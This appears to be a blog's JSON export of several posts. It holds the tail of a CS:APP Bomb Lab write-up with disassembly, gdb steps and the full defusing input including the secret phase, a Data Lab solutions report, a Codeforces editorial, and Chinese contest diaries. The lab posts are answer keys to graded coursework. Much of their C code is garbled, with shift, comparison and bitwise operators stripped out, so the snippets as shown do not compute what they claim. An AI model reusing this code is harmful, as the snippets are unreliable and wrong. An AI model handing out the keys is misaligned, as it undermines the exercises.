call 401242 secret_phase 401635:\tbf 58 25 40 00 mov $0x402558,%edi 40163a:\te8 d1 f4 ff ff call 400b10 puts@plt 40163f:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 401644:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b:\t00 00 40164d:\t74 05 je 401654 phase_defused+0x90 40164f:\te8 dc f4 ff ff call 400b30 __stack_chk_fail@plt 401654:\t48 83 c4 78 add $0x78,%rsp 401658:\tc3 ret 401659:\t90 nop 40165a:\t90 nop 40165b:\t90 nop 40165c:\t90 nop 40165d:\t90 nop 40165e:\t90 nop 40165f:\t90 nop The existence of a secret_phase can be identified by examining the phase_defused function. When inspecting at address 0x402619 with (gdb) x/s 0x402619, the format string %d %d %s is revealed. To investigate further, set a breakpoint at 0x4015fa using (gdb) b *0x4015fa. After running the bomb executable and providing the correct solution for the earlier phases, we can examine the content at address 0x603870 with (gdb) x/s 0x603870 (since the breakpoint is triggered during phase_4). This reveals that the %d %d %s format corresponds to the fourth phase, and we need to determine the correct string to enter along with the two integers. The code segment lea 0x10(%rsp),%rdi loads the address of the user-supplied string (the third argument) into %rdi, while mov $0x402622,%esi loads the address of the expected ciphertext into %esi. By examining memory with (gdb) x/s 0x402622, we obtain the string DrEvil. This is the secret password needed to unlock the hidden phase. Thus, to pass phase_4 and activate the secret_phase, we must append DrEvil as a third input after the two integer answers. One complete input sequence for the entire bomb could be: Border relations with Canada have never been better.1 2 4 8 16 320 2070 0 DrEvilionefg4 3 2 1 6 5``---```assembly0000000000401204 fun7: 401204:\t48 83 ec 08 sub $0x8,%rsp 401208:\t48 85 ff test %rdi,%rdi 40120b:\t74 2b je 401238 fun7+0x34 40120d:\t8b 17 mov (%rdi),%edx 40120f:\t39 f2 cmp %esi,%edx 401211:\t7e 0d jle 401220 fun7+0x1c 401213:\t48 8b 7f 08 mov 0x8(%rdi),%rdi 401217:\te8 e8 ff ff ff call 401204 fun7 40121c:\t01 c0 add %eax,%eax 40121e:\teb 1d jmp 40123d fun7+0x39 401220:\tb8 00 00 00 00 mov $0x0,%eax 401225:\t39 f2 cmp %esi,%edx 401227:\t74 14 je 40123d fun7+0x39 401229:\t48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d:\te8 d2 ff ff ff call 401204 fun7 401232:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236:\teb 05 jmp 40123d fun7+0x39 401238:\tb8 ff ff ff ff mov $0xffffffff,%eax 40123d:\t48 83 c4 08 add $0x8,%rsp 401241:\tc3 ret0000000000401242 secret_phase: 401242:\t53 push %rbx 401243:\te8 56 02 00 00 call 40149e read_line 401248:\tba 0a 00 00 00 mov $0xa,%edx 40124d:\tbe 00 00 00 00 mov $0x0,%esi 401252:\t48 89 c7 mov %rax,%rdi 401255:\te8 76 f9 ff ff call 400bd0 strtol@plt 40125a:\t48 89 c3 mov %rax,%rbx 40125d:\t8d 40 ff lea -0x1(%rax),%eax 401260:\t3d e8 03 00 00 cmp $0x3e8,%eax 401265:\t76 05 jbe 40126c secret_phase+0x2a 401267:\te8 ce 01 00 00 call 40143a explode_bomb 40126c:\t89 de mov %ebx,%esi 40126e:\tbf f0 30 60 00 mov $0x6030f0,%edi 401273:\te8 8c ff ff ff call 401204 fun7 401278:\t83 f8 02 cmp $0x2,%eax 40127b:\t74 05 je 401282 secret_phase+0x40 40127d:\te8 b8 01 00 00 call 40143a explode_bomb 401282:\tbf 38 24 40 00 mov $0x402438,%edi 401287:\te8 84 f8 ff ff call 400b10 puts@plt 40128c:\te8 33 03 00 00 call 4015c4 phase_defused 401291:\t5b pop %rbx 401292:\tc3 ret 401293:\t90 nop 401294:\t90 nop 401295:\t90 nop 401296:\t90 nop 401297:\t90 nop 401298:\t90 nop 401299:\t90 nop 40129a:\t90 nop 40129b:\t90 nop 40129c:\t90 nop 40129d:\t90 nop 40129e:\t90 nop 40129f:\t90 nop lea -0x1(%rax),%eax cmp $0x3e8,%eax The range of the input number must be $[1,1001]$. mov %ebx,%esi mov $0x6030f0,%edi call 401204 fun7 cmp $0x2,%eax The condition for passing the secret phase is that the return value of fun7(0x6030f0, input) must equal 2. fun7 Using (gdb) x/60x 0x6030f0 to inspect memory, we obtain the following data: 0x6030f0 n1: 0x0000000000000024 0x00000000006031100x603100 n1+16: 0x0000000000603130 0x00000000000000000x603110 n21: 0x0000000000000008 0x00000000006031900x603120 n21+16: 0x0000000000603150 0x00000000000000000x603130 n22: 0x0000000000000032 0x00000000006031700x603140 n22+16: 0x00000000006031b0 0x00000000000000000x603150 n32: 0x0000000000000016 0x00000000006032700x603160 n32+16: 0x0000000000603230 0x00000000000000000x603170 n33: 0x000000000000002d 0x00000000006031d00x603180 n33+16: 0x0000000000603290 0x00000000000000000x603190 n31: 0x0000000000000006 0x00000000006031f00x6031a0 n31+16: 0x0000000000603250 0x00000000000000000x6031b0 n34: 0x000000000000006b 0x00000000006032100x6031c0 n34+16: 0x00000000006032b0 0x00000000000000000x6031d0 n45: 0x0000000000000028 0x00000000000000000x6031e0 n45+16: 0x0000000000000000 0x00000000000000000x6031f0 n41: 0x0000000000000001 0x00000000000000000x603200 n41+16: 0x0000000000000000 0x00000000000000000x603210 n47: 0x0000000000000063 0x00000000000000000x603220 n47+16: 0x0000000000000000 0x00000000000000000x603230 n44: 0x0000000000000023 0x00000000000000000x603240 n44+16: 0x0000000000000000 0x00000000000000000x603250 n42: 0x0000000000000007 0x00000000000000000x603260 n42+16: 0x0000000000000000 0x00000000000000000x603270 n43: 0x0000000000000014 0x00000000000000000x603280 n43+16: 0x0000000000000000 0x00000000000000000x603290 n46: 0x000000000000002f 0x00000000000000000x6032a0 n46+16: 0x0000000000000000 0x00000000000000000x6032b0 n48: 0x00000000000003e9 0x00000000000000000x6032c0 n48+16: 0x0000000000000000 0x0000000000000000 A BST can be constructed at address 0x6030f0: 36 (n1) / \\ / \\ 8 (n21) 50 (n22) / \\ / \\ / \\ / \\ 6 (n31) 22(n32) 45(n33) 107(n34) / \\ / \\ / \\ / \\ 1 7 20 35 40 47 99 1001(n41)(n42)(n43)(n44)(n45)(n46)(n47)(n48) Translating the assembly logic of fun7 into C language: int func7 (T *u,int target) if (u == NULL) return -1; if (u = target) if (u == target) return 0; else return 2 * func7 (p - right,target) + 1; else return 2 * func7 (p - left,target); The function encodes the search path as a binary number. To obtain a return value of 2, the recursive sequence must satisfy $2 \\times (2 \\times 0 + 1) = 2$. This corresponds to the search path left → right → match: from root (36) go left to 8, then right to 22, where the value is found. Thus, the input that satisfies fun7(0x6030f0, input) == 2 is 22. Final answer: Border relations with Canada have never been better.1 2 4 8 16 320 2070 0 DrEvilionefg4 3 2 1 6 5","categories":["Academy"]},{"title":"CMU CS:APP Data Lab","path":"/2025/12/25/Data Lab/","content":"Data Labhttps://sunchaoyi923.github.io/file/Data%20Lab.pdf CS:APP Data Lab ReportName SUNCHAOYI IntroductionThis report documents the solutions to the CS:APP Data Lab problems. The goal of the lab is to solve a series of programming puzzles under strict constraints, using only a limited set of C operators to manipulate integer and floating-point bit patterns. Report bitXor Description: $x \\oplus y$. Legal ops: ~ Solution: Ops = 8 \\begin{align*} A \\oplus B &= \\overline{A} B \\cup A \\overline{B} \\\\ &= \\overline{\\overline{\\overline{A} B} \\cap \\overline{A \\overline{B}}} \\\\ \\end{align*} int bitXor (int x,int y) int a = ~((~x) y); int b = ~(x (~y)); return ~(a b); Ops = 7 (Opt.) \\begin{align*} A \\oplus B &= (A \\cup B) \\cap \\overline{A \\cap B} \\\\ &= \\overline{\\overline{A} \\cap \\overline{B}} \\cap \\overline{A \\cap B}\\\\ \\end{align*} int bitXor (int x,int y) return ~(~x ~y) ~(x y); tmin Description: Return minimum two’s complement integer. Legal ops: ! ~ ^ | + Solution: int tmin (void) return 1 31; isTmax Description: Returns 1 if $x$ is the maximum, two’s complement number, and 0 otherwise. Legal ops: ! ~ ^ | + Solution: The maximum two’s complement integer $T_{\\text{max}}$ has the property $x + 1 = \\sim x$, i.e. $(x + 1) \\oplus (\\sim x) = 0$. $x = -1$ is a special case ($\\texttt{0xffffffff}$) that need to be excluded. int isTmax (int x) return !((~(x + 1)) ^ x) !!(x + 1); allOddBits Description: Return 1 if all odd-numbered bits in word set to 1. Legal ops: ! ~ ^ | + Solution: Construct a number whose odd-numbered bits are all 1, i.e. the 32-bit pattern $\\texttt{0xAAAAAAAA}$. Ops = 9 int allOddBits (int x) int mask = (0xAA 24) | (0xAA 16) | (0xAA 8) | 0xAA; return !((x mask) ^ mask); Ops = 7 (Opt.) int allOddBits (int x) int a = 0xAA 8; int b = a | 0xAA; int c = b 16 | b; return !((x c) ^ c); negate Description: Return $-x$. Legal ops: ! ~ ^ | + Solution: \\begin{cases} x + (-x) = 0\\\\ x + (\\sim x) = -1 \\end{cases} \\Longrightarrow -x = (\\sim x) + 1 int negate (int x) return (~x) + 1; isAsciiDigit Description: Return 1 if $0x30 \\le x \\le 0x39$ (ASCII codes for characters 0 to 9). Legal ops: ! ~ ^ | + Solution: Upper 24 bits must be zero. Bits 4-7 must equal 0011. Lower 4 bits must be in range 0000 to 1001. (Check whether bit 3 is 0 to have more detailed classification.) Ops = 14 int isAsciiDigit (int x) int a = !(x 8); int b = !(x 4 ^ 0x3); int low = x 0xF; int c = !(low 3) | !(low 1 ^ 0x4); return a b c; Ops = 7 (Opt.) No need to use variable $a$ to checker upper 24 bits. use +6 to bound lower 4 bits within 1111. int isAsciiDigit (int x) int a = x 4 ^ 3; int b = ((x 0xF) + 6) 4; return !(a | b); conditional Description: Same as x ? y : z. Legal ops: ! ~ ^ | + Solution: Convert any non-zero $x$ to boolean. Create a mask that is either all zeros ($\\texttt{0x00000000}$) or all ones ($\\texttt{0xFFFFFFFF}$). Use the mask to select between $-y$ and $-z$. Ops = 14 int conditional (int x,int y,int z) int op = !!x; int a = (~op) + 1; int b = (~a) ((~y) + 1); // when mask = 0x00000000, b = -y; otherwise b = 0 int c = a ((~z) + 1); // when mask = 0xFFFFFFFF, c = -z; otherwise c = 0 return y + z + b + c; Ops = 8 (Opt.) int conditional (int x,int y,int z) int mask = (~(!!x)) + 1; return (y mask) | (z (~mask)); // one side must equal to 0 isLessOrEqual Description: If $x \\le y$ then return 1, else return 0. Legal ops: ! ~ ^ | + Solution: Different signs: If $x$ is negative and $y$ is non-negative, then $x \\leq y$ is always true. Same signs: We can safely compute $y - x$ without overflow and check if it’s non-negative. int isLessOrEqual (int x,int y) int signx = x 31 1; int signy = y 31 1; int diff = signx ^ signy; int a = diff signx; int b = !diff !((y + ((~x) + 1)) 31); // y - x = 0 return a | b; logicalNeg Description: Implement the ! operator using all of the legal operators except !. Legal ops: ~ ^ | + Solution: If $x = 0$, both $x$ and $-x$ have sign bit 0. Otherwise either $x$ or $-x$ have sign bit 1. $x | (-x)$ is $\\texttt{0x00000000}$ or $\\texttt{0xFFFFFFFF}$, just add 1 to solve it. int logicalNeg (int x) return ((x | ((~x) + 1)) 31) + 1; howManyBits Description: Return the minimum number of bits required to represent $x$ in two’s complement. Legal ops: ! ~ ^ | + Solution: For $x 0$ find the highest 0-bit, $x \\ge 0$ find the highest 1-bit. Use x ^ (x 31) to transform $x$ into the latter case. Use divide-and-conquer approach for the most significant 1-bit, and finally add the sign bit. int howManyBits (int x) int b16,b8,b4,b2,b1,b0; x = x ^ (x 31); b16 = (!!(x 16)) 4; x = b16; b8 = (!!(x 8)) 3; x = b8; b4 = (!!(x 4)) 2; x = b4; b2 = (!!(x 2)) 1; x = b2; b1 = !!(x 1); x = b1; b0 = x; return b16 + b8 + b4 + b2 + b1 + b0 + 1; // sign floatScale2 Description: Return bit-level equivalent of expression $2 \\times f$ for floating point argument $f$. Legal ops: Any integer/unsigned operations incl. ||, . Also if, while. Solution: Extraction the sign bit, exponent field and fraction field. When $exp = \\texttt{0xFF}$, just return it; When $exp = \\texttt{0x00}$, $frac \\times 2$; otherwise $exp + 1$. unsigned floatScale2 (unsigned uf) unsigned sign = uf 31 0x1; unsigned exp = (uf 23) 0xFF; unsigned frac = uf 0x7FFFFF; if (exp == 0xFF) return uf; else if (exp == 0x0) frac = 1; else ++exp; return (sign 31) | (exp 23) | frac; floatFloat2Int Description: Return bit-level equivalent of expression (int) $f$ for floating point argument $f$. Legal ops: Any integer/unsigned operations incl. ||, . Also if, while. Solution: Converting to integer with truncation: \\text{int}(f) = \\begin{cases} 0 & \\text{if } |f| < 1 \\\\ \\text{trunc}\\left(1.f \\times 2^{e-127}\\right) & \\text{if } 1 \\leq |f| < 2^{31} \\\\ \\text{INT{\\_}MIN} & \\text{otherwise (overflow)} \\end{cases}Where truncation is implemented by: When $E \\geq 23$: $1.f \\times 2^{E} = (1.f \\times 2^{23}) \\times 2^{E - 23}$ When $E 23$: Right shift discards fractional bits, i.e. $ (23 - E)$ int floatFloat2Int (unsigned uf) unsigned sign = uf 31 0x1; unsigned exp = (uf 23) 0xFF; unsigned frac = uf 0x7FFFFF; int E,M; E = exp - 127; if (E 0) return 0; if (E = 31) return 0x80000000u; M = (1 23) | frac; if (E = 23) M = E - 23; else M = 23 - E; return sign ? -M : M; floatPower2 Description: Return bit-level equivalent of the expression $2.0^x$ (2.0 raised to the power $x$). Legal ops: AAny integer/unsigned operations incl. ||, . Also if, while. Solution: Case 1 : Overflow $x E_{\\max} = e - 127 = 254 - 127 = 127$ return $\\texttt{0b01111111100…0}$, i.e. $\\texttt{0x7F800000}$ Case 2 : Normalized $e = E + 127 \\in [1,254] \\Longrightarrow E \\in [-126,127]$ $V = 1.0 \\times 2^{e - 127}$ $f = 0,\\quad V \\gets (e 23) | f$ Case 3 : Denormalized $e = 0$ $V = \\overline{0.f} \\times 2^{-126} = 2^x \\Longrightarrow \\overline{0.f} = 2^{x + 126}$ minimum number is $2^{-126} \\times 2^{-23} = 2^{-149}$, i.e. put 1 on index 0. $\\Longrightarrow V \\gets 1 (x + 149)$ Case 4 : Underflow $x -149$, return 0 unsigned floatPower2 (int x) if (x -149) return 0; else if (x 127) return 0x7F800000; else if (x = -126) return (x + 127) 23; else return 1 (x + 149); Correctness Results Perf ResultsPoints Rating Errors Points Ops Puzzle1 1 0 2 7 bitXor1 1 0 2 1 tmin1 1 0 2 8 isTmax2 2 0 2 7 allOddBits2 2 0 2 2 negate3 3 0 2 7 isAsciiDigit3 3 0 2 8 conditional3 3 0 2 14 isLessOrEqual4 4 0 2 5 logicalNeg4 4 0 2 32 howManyBits4 4 0 2 12 floatScale24 4 0 2 16 floatFloat2Int4 4 0 2 9 floatPower2Score = 62/62 [36/36 Corr + 26/26 Perf] (128 total operators)","categories":["Academy"]},{"title":"2025 CCPC 重庆站","path":"/2025/12/02/CCPC Chongqing25/","content":"CCPC 重庆站Day -18:00 坐车和牢邓一起走，路上小堵，但是一个小时不到就到达了机场，喜提卫星厅。还是早到了好久，打开电脑发现 STA 有作业了，果断开写。登机了，只好先合上电脑。但是在飞机里又等了一会儿，不小心在起飞前就把作业给写完了，于是开睡。两小时左右落地重庆，直奔宾馆。 歇了一会儿，到晚上去洪崖洞附近吃了火锅，然后走上大桥远观洪崖洞，还是被 6D 城市略微震惊了一下，导航的定位一直在飘，所以走错了好几次。 Day 0先来签到，白嫖了个水杯，领了物资，但是没有啥好的伴手礼。 打个热身赛，来陪牢邓双排。第一题怎么找规律，神秘，用拉插不是怎么解释都可以嘛（最后狂 WA 11 次总算试到了出题人想要的答案。 发现第三题做过了，悄悄掏出手机贺了一下过题的代码。 然后想第二题，带修的合并果子外加 $2^i$ 的额外条件，加了这个限制以后就可以二进制分块，然后贪心逐块累加。但是赛时没搞出来，后来听人讲了才悟到。 晚上小型团建，教牢邓和佬打台球。 Day 1开局发现签到 A 和 H，Zlw 先写模拟题 A，然后我看 H。一开始 H 想要分类讨论，但是一看数据范围果断枚举其中一个参数。中间没想清楚，还把佬从机子上踹下来两次又捧上去两次。最后他过完 A 以后我再 fix 了我的做法，中间因为奇偶性 WA 了一个样例，看了很久才发现问题。 接下去 Zlw 和 Sky 想了 E，觉得可以二分答案，于是果断用优先队列维护，在一小时以内就过了。 之后便是黑暗的 3 h 时间，我和 Sky 分别看了《使》《史》，以为可做还尝试了一会儿（事实上，两个题都是 hard，甚至是 if you are bored 题。毕竟题目名称都是 shi 了，我们竟然还敢吃）Zlw 想了 K 但是一直找不到 KMP 的一些性质，于是他想 M 去了，我和 Sky 想 B。 Zlw 说想到 M 了，于是把我们踹下去实现。我和 Sky 一度以为自己找到正确的递推式，但是之后在验证别的数据时才发现我们只是拟合怪罢了。Zlw 在经历了 $114514^{1919810}$ 秒的堆屎后终于写了个靠谱的做法，但是提交 WA。期间我上机敲了一个暴力，想找规律，结果 $n$ 开得太大，然后输出路径直接把 vscode 弄爆了，强制闪退然后进不去，强制关闭才解决问题，还好 vscode 有神秘自动保存，否则 zlw 的代码就要重敲一部分了（动动手 Ctrl + S 很难嘛🤬）。Zlw 看不出来错哪了，只好对拍。期间的 fun fact 是以为暴力过样例了，但是却没过编译。以及写完以后想找模板里的 cmp.sh 结果发现第一本的模板 version 1.0 里没有，然后第二本的在最后一页，但是貌似之前打比赛的时候疑似不小心被扯掉了，就是缺了这一页（（（，于是只能手动对拍。发现是个弱智的错误，把 $-v$ 敲成了 $-1$。第二发提交通过，发现已经封榜了。 然后三个人一起做 B，终于推对了式子，这时候还剩 20 min，于是我敲矩阵优化，他俩推式子。还剩 2 min 的时候弄完了，发现过了自测，直接交，WA！测样例大数据，发现有地方忘记开 long long 了，再交，WA！然后找错，发现没过全零的样例。发现初始化有地方不对，但是正想要修改发现已经比赛结束了！说实在有点可惜，本来以为要顽强拼搏奖了（但后来发现，这题过了也没 Ag 了）。 好吧，这场就第一小时和最后一小时有提交，全场倒闭，Cu 牌一枚（这就是马上要打 EC final 的队伍的水平吗）。感觉打的太烂了（尤其是我，似乎没有什么我擅长的题，因此贡献很小），不想去领奖。于是聚集了餐券，直接去食堂消费一波（买完想吃的以后，全部用来进货面包了），然后合了个影，回宾馆休息了。好在明天晚上的飞机，还能去玩会儿。 后记 这场感觉打得太松散了，也有可能因为是 CCPC，所以不够重视导致的。但这场没有计算几何和构造，这是不好的！（EC final 要等期末完再训练了，希望能拿个牌牌吧） 马上要期末考了，突然感觉时间有点紧张，但是先摆一会儿再说。还要准备给 CSC3200 举办一个复习讲座来着。 发现自己被抽到体育抽测了，悲！但是好在今年抽测了，明年就不用测了。","categories":["Journal"]},{"title":"题解：CF2110F Faculty","path":"/2025/11/26/CF2110F/","content":"不失一般性的，我们设 $x \\le y$。 从最简单的情况考虑，当 $x = y$ 时，$f(x,y) = 0 + 0 = 0$。以下均为 $x y$ 的情况，推推式子可知： f(x,y) = x \\bmod y + y \\bmod x= x + y - \\lfloor\\frac{x}{y}\\rfloor y - \\lfloor\\frac{y}{x}\\rfloor x由于 $x y$，式子可以进一步化简： f(x,y) = x + y - \\lfloor\\frac{y}{x}\\rfloor x由 $x y$ 可知 $\\lfloor\\frac{y}{x}\\rfloor \\ge 1$，于是可以得到以下观察： x \\le x + y \\bmod x = f(x,y) = y - (\\lfloor\\frac{y}{x}\\rfloor - 1)x \\le y分析可知，当 $x \\mid y$ 时不等式左侧取等；当 $x y 2x$ 时不等式右侧取等。 接下来考虑对于任意前缀长度为 $k$ 的答案是怎么取到的。当 $n = 1$ 时答案显然为 $0$，$n = 2$ 时为 $a_1 \\bmod a_2 + a_2 \\bmod a_1$。对于 $n \\ge 3$ 的情况，考虑 $f(x,y)$ 与 $f(y,z)$ 满足 $x \\le y \\le z$，由不等式可知 $x \\le f(x,y) \\le y \\le f(y,z) \\le z$，因此可以证明前缀长度为 $k$ 的最大值里一定有一个数取到 $\\max \\limits_{i = 1}^k\\{a_i\\}$。 再由不等式可知存在 $y \\ge 2x$ 的情况时才会使得答案变得不确定，而这种情况最多只会有 $\\log$ 次，因此直接暴力更新即可，总时间复杂度 $O(n \\log n)$。 代码如下： void solve () int n = read (); vector int a (n + 1),ans (n + 1,0); for (int i = 1;i = n;++i) a[i] = read (); int mx = a[1]; for (int i = 2;i = n;++i) if (a[i] mx) if (a[i] = mx * 2) for (int j = 1;j i;++j) ans[i] = max (ans[i],a[i] % a[j] + a[j] % a[i]); else ans[i] = a[i]; mx = a[i]; else ans[i] = max (ans[i - 1],mx % a[i] + a[i] % mx); for (int i = 1;i = n;++i) printf (%d ,ans[i]); puts ();","categories":["Solution"]},{"title":"2025 ICPC 南京站","path":"/2025/11/24/ICPC Nanjing25/","content":"ICPC 南京站Day -1周五早上的飞机，落地后在酒店楼下吃了铁锅炖，豪赤！休息了一会儿我去南大找我的初中同学玩，有点远，地铁做了一个多小时，运气不好还下雨了。在校园里随便逛了逛以后就去吃饭了，吃烤鱼，聊天的过程中顺便了解一下他们的课程（由于专业相近，所以还白嫖了个计算机系统基础的课程链接），羡慕南大有这么好的课程体系安排！ Day 0早上闹钟没听到，还是被队友叫醒的。吃了早饭直接去签到，参赛服好评，然后参与游戏获得一只迷你版袋鼠。骑电瓶车逛校园，十分惬意，刚好 30 min 还车，没有多付款。然后想着有点早，去食堂可以买点奶茶，但是发现餐券有效范围过小，于是就坐下歇着，开始摆弄袋鼠。 下午热身赛，竟然要存包（好像被说了，后来负责人和保安沟通了就不用了）。获得一只大袋鼠，开赛前又是各种袋鼠摆 pos 的传统，群里图片乱飞。热身赛果然都是袋鼠题，其中三道做过，于是很快地再次复现了出来。还有两道题我们分工，然后差不多都有思路，于是上机写。但所剩时间不多（由于一开始发现题目基本做过，于是去调 bash 了，所以没剩多少时间写题），最后这两题没过，打算晚上补一下。回去路上简单瞅了题解，发现思路都是对的，所以说是口胡 AK（。 Day 1开局良心签到，飞速通过。之后是一个象棋的简化版，想了一下发现只需要判断一步即可得到结果。然后我第一反应是直接列出所有情况，疯狂敲 if 然后 WA，冷静了一下直接循环枚举所有情况，然后又 WA，瞪了好久才发现有一个 $dy$ 敲成了 $dx$。成罪人了 WA 了三发 1h 才过。 之后 Zlw 佬发现 F 是一个贪心加 bfs 的题，敲完一发通过。跟了一下榜发现 G,I 有一车人通过，但是想了想这两题发现我们三人都不会。佬提出我们应该多看一点题，于是开了 H，发现可做。 以下证明 SUNCHAOYI 是入机： Zlw: 这道题我们可以先预处理出 $f_{l,r}$ 表示这段区间内有多少个满足中间条件限制的数量。但是怎么快速处理出来呢？ Scy: 先不管前缀，枚举两个重复子串的同一侧端点，然后就可以把 border 转化成哈希判断是否相等的问题，用二分加个 log 就行。 Zlw: 哦有道理，那么相当于前缀就是等差数列的贡献，随便维护一下就好了。 Scy: 对，可以用差分代替线段树。 Zlw: 那两侧的答案怎么统计呢？好像和刚刚的过程有点像。 Scy: 前缀和就行了。 Zlw: 哎，那好像这题做完了。 Zlw: 啊呀，差分咋写来着？ Scy: 两次前缀和，阿巴阿巴阿巴！ 证明完毕。prompt 正确，直接胡出来了。 然后就过样例了，差点忘记取模，然后提交！测了一万年，一发通过！ 然后剩下的两个小时疯狂的在 G,I 之间徘徊，但是最后都不会，4 题遗憾离场。 讲题，发现 G 题可以将两个参数分离，于是就可以简单贪心了，懊悔怎么没想到，但是转念一想过了也 Au 不了，又感觉还好（bushi。 滚榜，竟然意外的守住银了，在正是队伍中排 80 多名，就这样吧，SUA 题真的好难！ 不知道还有没有机会打 EC，感觉离退役不远了，滚回学校学 CS 去了。 【赛后补题】 G 主要就是理解合并，即让较小容量和较大流速失效。将桶分别按照容量由小到大排序，记为 $A$，再按照流速由大到小排序，记为 $B$。那么也就是最后需要保留 $A$ 与 $B$ 的一段同样长度的后缀。当想要再失效一组容量和流速，发现水会漏完时，情况已经不优，因此对于一组询问直接二分答案即可。 I 是一个读题细节很多的 DP，读完题后需要意识到需要从后往前 dp。因此，设 $dp_{i,j,opa,opb}$ 四维表示前 $i$ 天剩 $j$ 元，$A,B$ 两人是否已经支付一次的最大价值。注意 $j 0$ 的状态直接设为非法，又由于需要从后往前，dfs 记忆化即可，代码竟然异常好写。 M 组合加 NTT 优化题，还是相当的不熟练啊，借着 AI 的理解又推了一万年。考虑 $(P_i,P_{(i + d) \\bmod n})$ 为凸 $k$ 多边形的一条边，则两线段右侧的 $d - 1$ 个点失效，剩余的 $n - 2 - (d - 1) = n - d - 1$ 个点需要选择 $k - 2$ 个组成 $k$ 凸多边形。 令 $F_d$ 表示选距离为 $d$ 的点作为一条边时的贡献，则有凸 $G_k$ 边形的面积和的两倍 $G_k$ 为 G_k = \\sum \\limits_{d = 1}^{n - 1} \\binom{n - d - 1}{k - 2}F_d \\\\ = \\frac{1}{(k - 2)!} \\sum \\limits_{d = 1}^{n - k + 1} \\frac{(n - 1 - d)!}{(n - k + 1 - d)!} F_d令 $A_d = (n - d - 1)! \\times f(d)$，$B_d = \\frac{1}{i!}$，则有 C_k = \\sum \\limits_{i = 1}^{k} A_i \\times B_{k - i}\\\\ G_k = \\frac{1}{(k - 2)!} C_{n - k + 1}当然，还需要快速求出 $F_d$ 的值，用叉积表示面积的两倍，则有 F_d = \\sum \\limits_{i = 0}^{n - 1} (x_i y_{(i + d) \\bmod n} - y_i x_{(i + d) \\bmod n})以 $\\sum \\limits_{i = 0}^{n - 1} x_i y_{(i + d) \\bmod n}$ 为例，先倍长数组，令 $X = [x_0,x_1,\\cdots,x_{n - 1},0,0,\\cdots,0]$，$Y = [y_0,y_1,\\cdots,y_{n - 1},y_0,y_1,\\cdots,y_{n - 1}]$。再令 $Y^{rev}$ 表示 $Y$ 的反转数组 $Y^{rev} = [y_{n - 1},\\cdots,y_1,y_0,y_{n - 1},\\cdots,y_1,y_0]$。则有 H1_d = \\sum \\limits_{i = 0}^{2n - 1} X_i \\times Y_{i + d} \\\\ = \\sum \\limits_{i = 0}^{n - 1} X_i \\times Y_{i + d}\\\\ = \\sum \\limits_{i = 0}^{2n - 1 - d} X_i \\times Y^{rev}_{2n - 1 - d - i}其中上限可以改变是因为倍长的时候 $x_{n} \\sim x_{2n - 1}$ 均为 $0$，而最后 $H_k$ 也就是卷积后 $C_{2n - d - 1}$ 的值。 计算另一半 $H2_d$ 同理，最后 $F_d = H1_d - H2_d$。 做三次完整的 NTT 即可得到答案，时间复杂度为 $O(n \\log n)$。","categories":["Journal"]},{"title":"2025 ICPC 武汉站","path":"/2025/11/05/ICPC Wuhan25/","content":"ICPC 武汉站Day -1队友还要考试，那和我有什么关系？果断一人周五早上出发。12:00 起飞，原来预计 2 个多小时的路程，结果 13:30 就到了。刚在飞机上看了会儿离散的卷子，吃了点东西提示要降落了。不过差评的是竟然没有主食，只发鸡肉肠大 main 包，饿死我了连吃两个勉强吃饱。 下了飞机发现到达层和出发层在一起？纠结了很久，最终还是坐 2 号线兜兜转转的来到了酒店（本来想先去玩玩的，但是想着有行李，顺便还得给手机充个电）。 歇了会儿先去吃了碗热干面，豪赤😋！然后趁着俩队友考 CSC4120 的时间去江汉路步行街凑个热闹，然后又去了黄鹤楼和武汉长江大桥，最后沿东湖骑车回来的。今天似乎是万圣夜，所以江汉路👻超多（ 以及，武汉大学感觉真的好大，在环湖骑骑了半天，只是从武汉大学的一个门到另外一个门，累鼠（） 早点睡了，明天早点去签到，白嫖礼品，顺便抢夺队友的物资！ Day 0签到日。 为什么校内电瓶车不让我们骑啊？？？只能走路前往卓尔体育馆。 领物资拍照片，现场似乎有点混乱，发牌牌一直找不到我们的学校，愣是等了很久。赞助商的小玩意儿似乎没有去年南京站的好，不过还是白嫖了一些。拍照就只能我一个拍了，作为队长还是心系队友，把队友的拍拍也一起拿着拍照了！ 为什么餐券是指定时段指定食堂的？而且这个食堂和体育馆距离 1.5 km，这合理吗？午饭是 11:00-13:00，在宾馆休息到了 12:00 就准备溜过去。 【插播】圣地巡礼图 中午去食堂吃饭，用了一整张餐券点了个卤肉饭但是不怎么好吃。既然队友不在，那就用掉他们的，买了份糖水，外加 2 瓶饮料。奶茶和冰淇淋的队伍实在太长了懒得等，于是剩下的餐券只能作废了。 热身赛还早，缓慢挪动到体育馆。中途偶遇陈教授，趁机收获一枚吧唧。在门口等的时候又遇到了蒋老师，于是果断要了合照。 下午热身赛就只能我一个人打了，倒闭预警。开题后发现有中文题目，A 题 A + B，B 题 24 昆明的简单构造，C 题 24 昆明热身赛的题，D 题 24 昆明的金牌题 D 题。C 去年我同学问我的时候还不会，今天会了，但是由于调试的时候改动了数组范围，导致 WA 了一发。D 想到了一个做法，但是没来得及写完，由于我之前没 VP 过 24 昆明，后来看了发现 D 赛时就 4 队通过，估计我是想假了。顺便在这个 2h 的热身赛测了测 submit 和 printfile，都有二次确认，还不错。以及，今天发🎈和打印真的好慢，希望今天各位志愿者有在热身赛好好热身吧！ Day 1正赛前两小时十分顺畅，甚至一度进到金牌线。第一小时两题，Zlw 佬先过了 F 签到，然后我会了 E，不过第一发没思考仔细没考虑奇偶性，虽然自测样例有，但是我和 Sky 都没注意到答案输出错了。第二小时 Sky 看了 M，是个线代矩阵的构造，题目挺难懂，看了好久才看出来。由空集的性质可以推出主对角线 $A_{i,i} = a_i + 1$，然后剩下的位置 Sky 开始尝试手玩，玩了一会儿发现给玩出来了，大概是这样的形式： \\begin{bmatrix} a_1 + 1 & a_2 & \\cdots & a_n \\\\ a_1 & a_2 + 1 & \\cdots & a_n \\\\ \\vdots & \\vdots & \\ddots & \\vdots\\\\ a_1 & a_2 & \\cdots & a_n + 1 \\end{bmatrix}K 算是一个贪心。考虑一种颜色，如果它们要匹配，位置一定是相邻的两个。最后总代价是固定的，一定是 $\\sum{\\frac{|i - j|}{2}}$，而且 $\\sum{|i - j|}$ 一定是个偶数。构造的话，每次从左到右，找下一个出现的位置比较小的地方，贪心的给他换过去就好了。至于为什么是 $3n$，只是代码实现会比较方便罢了。 之后 Zlw 和 Sky 开始看 H，然后 C 